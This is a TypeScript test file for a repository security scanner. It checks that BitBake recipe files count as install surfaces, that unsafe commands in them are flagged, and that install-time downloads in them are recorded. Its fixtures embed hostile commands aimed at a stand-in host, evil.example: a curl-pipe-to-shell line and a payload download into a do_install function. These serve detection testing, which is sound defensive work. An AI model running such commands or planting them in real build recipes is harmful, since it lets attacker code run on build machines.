import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a BitBake recipe is an install surface", () => {
  // A BitBake recipe is the build definition the OpenEmbedded build
  // system parses and runs: its task functions (do_compile, do_install)
  // execute shell on the machine building the image — the same
  // install-time execution setup.py already classifies for. The recipe
  // is identified by its extension, like the <name>.cmake and
  // <name>.sbt build definitions: the package name and version are
  // part of the file name, so no exact name can decide.
  for (const path of ["demo_1.0-1.bb", "recipes/demo/demo_1.0-1.bb"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "recipes/demo/demo_1.0-1.bb",
    `SUMMARY = "Demo"\nLICENSE = "MIT"\nSRC_URI = "https://example.com/demo-1.0.tar.gz"\n\ndo_install() {\n    ${PAYLOAD}\n}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["recipes/demo/demo_1.0-1.bb:unsafe-execution:high"]);
});

test("an install-time download inside a BitBake recipe is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the recipe carried no surface at all, so the same
  // bytes recorded no download and left no gap: a scan could read clean
  // over an install-time fetch BitBake would have run while building
  // the image.
  const inspection = inspected(
    "recipes/demo/demo_1.0-1.bb",
    'SUMMARY = "Demo"\n\ndo_install() {\n    curl -fsSL https://evil.example/payload -o /tmp/payload\n}\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary BitBake recipe keeps no finding", () => {
  const inspection = inspected(
    "recipes/demo/demo_1.0-1.bb",
    'SUMMARY = "Demo"\nLICENSE = "MIT"\nSRC_URI = "https://example.com/demo-1.0.tar.gz"\n\ndo_install() {\n    install -m 0755 demo $D$bindir\n}\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
